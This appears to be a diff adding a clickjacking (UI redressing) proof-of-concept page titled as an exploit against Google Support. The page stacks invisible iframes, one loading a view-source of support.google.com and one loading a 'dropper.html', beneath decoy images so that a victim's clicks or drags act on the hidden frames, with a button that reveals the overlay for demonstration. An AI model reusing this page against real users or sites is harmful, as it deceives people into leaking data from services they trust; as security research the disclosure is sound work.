@@ -1,0 +1,47 @@
+<html>
+	<head>
+		<title>UI Redressing Mayhem - Google Support Proof of Concept Exploit</title>
+
+		<script>
+
+			function setFull() {
+				document.getElementById('trash').src = 'full.png';
+				document.getElementById('onemore').style.visibility = 'visible';
+			}
+			
+			function showTheMagic() {
+			
+				if(document.getElementById('bottom').style.opacity == 0)
+					document.getElementById('bottom').style.opacity = '0.3';
+				else
+					document.getElementById('bottom').style.opacity = '0.0';
+			}
+			
+		</script>		
+	</head>
+
+	<body>
+
+		<input type='submit' value='show me the magic' onclick='showTheMagic()'/>
+			
+		<div style='position:fixed; top:20px'>
+		
+			<div id="bottom" style="opacity:0.0;z-index:1;position:fixed;width:60%;height:100%" align='center'>
+			
+				<iframe id="content" style="position:fixed;top:23px;left:530px;" src="view-source:view-source:http://support.google.com/?hl=it" width="50%" height="200px" scrolling='auto'></iframe>
+
+				<iframe onmouseover='setFull()' style="position:fixed;top:280px" src="dropper.html" width="40%" height="40%" ></iframe>
+						
+			</div>
+				
+			<div id="top" style="opacity:1.0;z-index:-1;position:fixed;width:90%;height:100%" align='center'>
+			
+				<img src="support.png" id="support" width='8%'/>
+				
+				<img style="position:fixed;top:80px;left:250px;visibility:hidden;" src="onemore.png" id="onemore" />
+				
+				<br/>
+				<img style="position:fixed;top:330px" src="empty.png" id="trash" />				
+			</div>
+	</body>
+</html>
